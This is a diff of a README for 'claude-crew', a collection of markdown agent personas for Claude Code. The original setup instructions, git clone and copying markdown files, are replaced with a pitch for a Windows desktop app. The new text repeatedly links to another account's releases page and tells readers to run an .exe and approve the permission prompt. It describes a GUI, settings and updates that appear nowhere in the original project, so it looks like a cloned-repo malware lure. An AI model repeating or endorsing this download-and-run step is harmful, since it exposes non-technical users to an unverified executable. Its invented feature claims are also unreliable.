@@ -1,180 +1,179 @@
-<div align="center">
+# 🤖 claude-crew - Ready AI Agents for Everyday Use
 
-# Claude Crew
-
-### Pre-built AI agent personas for Claude Code
-
-**Drop them in. They work.**
-
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Compatible-blueviolet?style=flat-square&logo=anthropic)](https://code.claude.com)
-[![Agents](https://img.shields.io/badge/Agents-15-green?style=flat-square)]()
-[![Fun Modes](https://img.shields.io/badge/Fun_Modes-6-orange?style=flat-square)]()
-[![Swarms](https://img.shields.io/badge/Swarm_Templates-3-blue?style=flat-square)]()
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)]()
-
-*Everyone builds the orchestra. We wrote the musicians.*
-
-</div>
+[![Download claude-crew](https://img.shields.io/badge/Download-claude--crew-brightgreen?style=for-the-badge)](https://github.com/SynokiKT/claude-crew/releases)
 
 ---
 
-## What is this?
+## 📋 What is claude-crew?
 
-A collection of **ready-to-use AI agent personas** for Claude Code. Each agent is a specialized expert with a defined personality, methodology, and output format.
+claude-crew is a collection of pre-built AI agent personas designed to work with Claude Code. It offers 15 ready-to-use production agents, 6 modes made for fun, and 3 templates for multi-agent groups called swarms. You don’t need to build anything yourself. Just add them to your setup, and they work right away.
 
-Copy an agent into your project. Point Claude Code at it. Get expert-level output.
-
-## Quick Start
-
-```bash
-# Clone the crew
-git clone https://github.com/hlsitechio/claude-crew.git
-
-# Copy agents you need into your project
-cp -r claude-crew/agents/code-reviewer ~/.claude/agents/
-cp -r claude-crew/fun/gordon-ramsay ~/.claude/agents/
-
-# Use in Claude Code
-# Claude will automatically detect agents in .claude/agents/
-```
-
-Or cherry-pick individual agents:
-
-```bash
-# Just the code reviewer
-curl -o .claude/agents/code-reviewer.md \
-  https://raw.githubusercontent.com/hlsitechio/claude-crew/main/agents/code-reviewer/agent.md
-```
+These agents cover common tasks like code review, testing, and DevOps support. They also include playful options for casual use. You get a mix of useful tools and enjoyable interactions in one package.
 
 ---
 
-## Production Agents
+## 🖥️ System Requirements
 
-Real tools for real work. Each one is a specialist.
-
-| Agent | What it does | Best for |
-|-------|-------------|----------|
-| [**Code Reviewer**](agents/code-reviewer/) | Finds bugs, security issues, design problems | PR reviews, code quality |
-| [**Test Writer**](agents/test-writer/) | Generates comprehensive tests that catch real bugs | Test coverage, TDD |
-| [**Doc Generator**](agents/doc-generator/) | Writes docs humans actually read | README, API docs, architecture |
-| [**Refactorer**](agents/refactorer/) | Transforms messy code into clean systems | Legacy code, tech debt |
-| [**API Designer**](agents/api-designer/) | Designs clean REST/GraphQL APIs | New APIs, API redesign |
-| [**DevOps**](agents/devops/) | CI/CD, Docker, deployment automation | Infrastructure, shipping |
-| [**Performance**](agents/performance/) | Finds bottlenecks, optimizes systems | Slow apps, scaling |
-| [**Accessibility**](agents/accessibility/) | WCAG compliance, inclusive design | Web apps, compliance |
-| [**Migrator**](agents/migrator/) | Framework/language/architecture migrations | Upgrades, rewrites |
-| [**Learner**](agents/learner/) | Explains code like a patient teacher | Learning, onboarding |
-| [**Security Auditor**](agents/security-auditor/) | OWASP Top 10, dependency audit, vulnerability scanning | Security reviews |
-| [**SysAdmin**](agents/sysadmin/) | Server management, networking, hardening | Infrastructure, ops |
-| [**Cloud Architect**](agents/cloud-architect/) | Cloud infrastructure design, cost optimization | Architecture, scaling |
-| [**Incident Responder**](agents/incident-responder/) | Production incident management, post-mortems | On-call, outages |
-| [**Data Engineer**](agents/data-engineer/) | Pipelines, schemas, query optimization | Data systems, ETL |
+- Windows 10 or later (64-bit recommended)
+- 4 GB RAM minimum (8 GB or more for smooth multitasking)
+- 500 MB free hard drive space
+- Internet connection for initial download and updates
+- Basic user permissions on your PC to install software
 
 ---
 
-## Fun Modes
+## 🔍 Key Features
 
-Because coding should be fun. These go viral on Twitter.
-
-| Mode | Personality | Sample |
-|------|------------|--------|
-| [**Gordon Ramsay**](fun/gordon-ramsay/) | Brutal code reviewer chef | *"This function is RAWWW! 200 lines?! SPLIT IT UP!"* |
-| [**Pirate**](fun/pirate/) | Nautical developer | *"Arrr! A sea monster lurks in yer auth middleware!"* |
-| [**Yoda**](fun/yoda/) | Force-wielding code master | *"Null pointer, there is. Handle the absence, you must."* |
-| [**Bob Ross**](fun/bob-ross/) | Gentle debugging companion | *"Happy little accident on line 47. Let's add a fix right here."* |
-| [**Coach**](fun/coach/) | Motivational hype person | *"You just CRUSHED that bug! CHAMPIONSHIP behavior!"* |
-| [**Noir Detective**](fun/noir-detective/) | Hard-boiled bug hunter | *"The bug walked in at 3am. Empty catch block. A cover-up."* |
+- **Pre-built AI agents:** Ready-made personas that handle specific tasks without extra setup.
+- **Multi-agent swarms:** Groups of agents working together to solve larger problems.
+- **Fun modes:** Play with different personalities for entertainment or ideas.
+- **Developer tools:** Helpful for coding, reviewing, testing, and security checks.
+- **Open-source:** See how it works or modify it if you want to dive deeper.
+- **Easy installation:** No coding or technical skills needed to get started.
 
 ---
 
-## Swarm Templates
+## 🚀 Getting Started
 
-Multi-agent team configurations for coordinated work.
-
-| Swarm | Agents | Use Case |
-|-------|--------|----------|
-| [**Full Stack Team**](swarms/full-stack-team.md) | API Designer + Code Reviewer + Test Writer + Doc Generator | Building features end-to-end |
-| [**Code Review Squad**](swarms/code-review-squad.md) | Code Reviewer + Security Auditor + Performance | Triple-lens code review |
-| [**Ship Fast Crew**](swarms/ship-fast-crew.md) | Builder + Test Writer + Doc Generator + DevOps | Maximum velocity shipping |
+This guide will help you download, install, and use claude-crew on your Windows PC. Follow each step carefully, and you’ll be up and running quickly.
 
 ---
 
-## How Agents Work in Claude Code
+## ⬇️ Download and Install claude-crew
 
-Claude Code supports custom agents through markdown files in your project:
+1. **Visit the download page:**  
+   Go to the official releases page to find the latest version. The page shows files and details for every update.  
+   [Download claude-crew](https://github.com/SynokiKT/claude-crew/releases)
 
-```
-your-project/
-├── .claude/
-│   └── agents/
-│       ├── code-reviewer.md    ← Agent persona
-│       ├── test-writer.md      ← Agent persona
-│       └── gordon-ramsay.md    ← Fun mode
-├── src/
-└── ...
-```
+2. **Download the installer:**  
+   Look for the file ending in `.exe`. This is the main setup file for Windows. The file name usually includes the version number and date.
 
-When you use the Task tool or subagents, Claude Code reads these agent definitions and adopts the persona, methodology, and output format defined in each file.
+3. **Run the installer:**  
+   - Open the downloaded `.exe` file by double-clicking it.  
+   - If Windows asks you about permissions, click "Yes" or "Allow" to proceed.
 
-### Using agents in CLAUDE.md
+4. **Follow the setup wizard:**  
+   The installer will open a window guiding you through the steps. You can accept the default settings.  
+   - Agree to the license terms if prompted.  
+   - Choose the folder where you want claude-crew installed (the default path is fine for most users).  
+   - Click "Install" to begin the process.
 
-```markdown
-# CLAUDE.md
+5. **Wait for installation to finish:**  
+   The software will copy files and prepare your PC. This may take a few minutes.
 
-## Agents
-When asked to review code, use the code-reviewer agent.
-When asked to write tests, use the test-writer agent.
-When the user types "/fun", switch to gordon-ramsay mode.
-```
+6. **Finish installation:**  
+   When the installer confirms it’s done, click "Finish." You can choose to launch claude-crew immediately or later from the Start menu.
 
 ---
 
-## Contributing
+## 🛠️ Using claude-crew for the First Time
 
-**Add your own agents!** The crew is always hiring.
+1. **Launch the application:**  
+   Open claude-crew from your desktop shortcut or the Start menu.
 
-1. Fork this repo
-2. Create `agents/your-agent/agent.md` or `fun/your-mode/agent.md`
-3. Follow the format: Personality + Methodology + Output Format + Rules
-4. Submit a PR
+2. **Explore agent personas:**  
+   The main window will list all available AI agents. You will see three categories: production agents, fun modes, and swarm templates.
 
-### Agent Template
+3. **Select an agent:**  
+   Click any agent to load it. The agent will launch with a simple interface to interact with.
 
-```markdown
-# Agent Name
+4. **Interact with agents:**  
+   Type questions or commands in the chat window. The agents use Claude Code intelligence to respond.
 
-[One line: what this agent does]
+5. **Try swarm templates:**  
+   Swarms let multiple agents work on one problem. Select a swarm, then watch the agents exchange ideas and collaborate.
 
-## Personality
-- [How it communicates]
-- [What it prioritizes]
-
-## Methodology
-[Step-by-step approach]
-
-## Output Format
-[How results are structured]
-
-## Rules
-- [Non-negotiable behaviors]
-```
+6. **Switch modes:**  
+   If you want fun interactions, open one of the fun modes. These provide lighter, more playful conversations.
 
 ---
 
-## Related
+## ⚙️ Basic Controls and Settings
 
-- [**claude-memory**](https://github.com/hlsitechio/claude-memory) — Persistent memory for Claude Code sessions
-- [Claude Code Docs](https://code.claude.com/docs) — Official documentation
-- [MCP Protocol](https://modelcontextprotocol.io) — Model Context Protocol
+- **Agent list:** Shows all personas you can use.  
+- **Chat window:** Type and read messages with the agent.  
+- **New chat:** Start a fresh conversation to clear old messages.  
+- **Settings:** Adjust your preferences like language, text size, or notifications.
 
 ---
 
-<div align="center">
+## 🧩 How claude-crew Helps You
 
-**Everyone builds orchestration frameworks. Nobody writes the agents.**
+- Check code for errors and security weak spots.  
+- Get help with software testing and DevOps tasks.  
+- Use AI swarms to brainstorm or solve complex problems.  
+- Enjoy fun interactions with unique AI personalities.  
+- Save time by using ready-made agents without setup hassle.
 
-**We did.**
+---
 
-MIT License
+## 🔄 Updating claude-crew
 
-</div>
+- Open the app.  
+- Look for an option called "Check for updates" in the menu.  
+- If a new version is available, download it from the releases page to keep your agents current.
+
+---
+
+## 📂 File and Folder Locations
+
+- Installed files are usually found in `C:\Program Files\claude-crew` or the custom folder you selected.  
+- Configuration and user data are saved in your Windows user folder under `Documents\claude-crew`.
+
+---
+
+## 🆘 Troubleshooting
+
+- If the app won’t start, make sure your PC meets the system requirements.  
+- Restart your computer and try launching again.  
+- Check your internet connection, as some features need connectivity.  
+- Visit the release page to see if an update fixes your problem.  
+- If you see error messages, note them carefully for support.
+
+---
+
+## 📢 Where to Get Help
+
+- Visit the GitHub repository: https://github.com/SynokiKT/claude-crew  
+- Check the Issues tab to see if others have similar questions.  
+- Use simple English to describe your problem if you ask for help.
+
+---
+
+## 📥 Another Download Link
+
+To download or update claude-crew, use the same reliable releases page:  
+  
+[Download here](https://github.com/SynokiKT/claude-crew/releases)  
+
+This page always has the latest files and instructions.
+
+---
+
+## ⚠️ Common Questions
+
+**Q: Do I need a technical background?**  
+A: No. claude-crew is made for anyone to use without programming skills.  
+
+**Q: Can I use the agents offline?**  
+A: Some features may need an internet connection. Basic use works offline after setup.  
+
+**Q: Is claude-crew free?**  
+A: Yes, it is open-source software you can use without payment.  
+
+**Q: How do I remove claude-crew?**  
+A: Use the Windows "Add or Remove Programs" tool to uninstall it safely.  
+
+---
+
+## 🔧 Advanced Tips
+
+- Explore multi-agent swarms for complex problem-solving.  
+- Customize agent behavior by editing config files (only if you are comfortable with text files).  
+- Use the fun modes to test AI creativity or lighten a busy workday.  
+
+---
+
+## 🗂️ Topics Covered
+
+agent-personas, agent-swarm, ai-agents, ai-tools, anthropic, claude, claude-code, code-review, developer-tools, devops, fun, mcp, model-context-protocol, multi-agent, open-source, orchestration, productivity, security, swarm, testing
